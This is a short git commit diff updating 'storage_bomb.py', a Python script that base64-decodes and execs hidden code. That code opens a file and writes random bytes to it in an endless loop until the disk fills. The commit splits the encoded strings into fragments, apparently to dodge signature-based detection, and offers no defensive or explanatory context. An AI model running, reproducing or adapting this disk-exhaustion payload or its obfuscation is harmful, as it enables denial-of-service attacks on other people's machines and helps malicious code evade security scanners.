74de5d86400d97f425586296a35e4c1a7ef4350c
rf-peixoto <50427765+rf-peixoto@users.noreply.github.com>
2021-06-05 13:52:05 -0300

    Update storage_bomb.py

--- Code/Python/storage_bomb.py
+++ Code/Python/storage_bomb.py
@@ -1,7 +1,7 @@
 from base64 import b64decode
 a = b'aW1wb3J0IG9z'
-b = b'ZGF0YT1vcGVuKCdwYWNrYWdlJywgJ2FiJyk='
-c = b'd2hpbGUgVHJ1ZTpkYXRhLndyaXRlKG9zLmdldHJhbmRvbSg2NCkp'
+b = b'ZGF0YT1vcGVu' + b'KCdwYWNrYWd' + b'lJywgJ2FiJyk='
+c = b'd2hpbGUgVHJ1' + b'ZTpkYXRhLnd' + b'yaXRlKG9zLmd' + b'ldHJhbmRvbSg' + b'2NCkp'
 exec(b64decode(a).decode())
 exec(b64decode(b).decode())
 exec(b64decode(c).decode())
